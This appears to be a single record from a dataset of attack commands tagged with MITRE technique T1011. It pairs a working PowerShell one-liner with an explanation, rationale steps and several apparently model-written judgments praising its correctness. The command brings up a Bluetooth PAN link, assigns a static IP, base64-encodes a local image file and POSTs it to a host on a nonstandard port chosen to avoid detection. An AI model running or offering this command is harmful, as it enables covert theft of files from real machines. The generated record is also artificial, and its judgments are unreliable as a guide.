command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Pictures\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null
explanation: Uses Bluetooth PAN with a static IP and exfiltrates data via an HTTP POST to a custom port reachable only over the Bluetooth link (T1011).
rationale_steps: Activate NAP over Bluetooth as the alternate network medium.
Assign a restricted /30 IP on the Bluetooth interface with netsh.
Use HTTP on a high, nonstandard port to minimize detection.
Ensure destination is on the Bluetooth-only subnet to force egress via Bluetooth.

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced quotes, valid separators, and correct parameter usage across all statements.
llm_judgments.semantic_justification: It automates establishing a Bluetooth PAN, assigns a static IP, base64-encodes a file, and exfiltrates it via HTTP POST over that link, but success depends on BluetoothCL support and likely requires admin rights for the IP configuration.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax, and appropriate use of variables and pipeline operations.
llm_judgments.semantic_justification: The command fully implements automated exfiltration by establishing a Bluetooth PAN connection, configuring a static IP, reading and encoding a file, and exfiltrating it via HTTP POST to a specific endpoint, aligning perfectly with the T1011 technique.

llm_judgments.syntactic_justification: The command is perfectly well-formed for PowerShell, with correct syntax for cmdlet execution, variable assignment, .NET method calls, external command invocation, and proper use of separators and quoting.
llm_judgments.semantic_justification: While the overall flow and technique align well with T1011 by configuring a Bluetooth PAN for data exfiltration, the `netsh interface ip set address` command requires Administrator privileges, directly contradicting the stated 'Privilege: None' and preventing the full command chain from executing successfully as described.
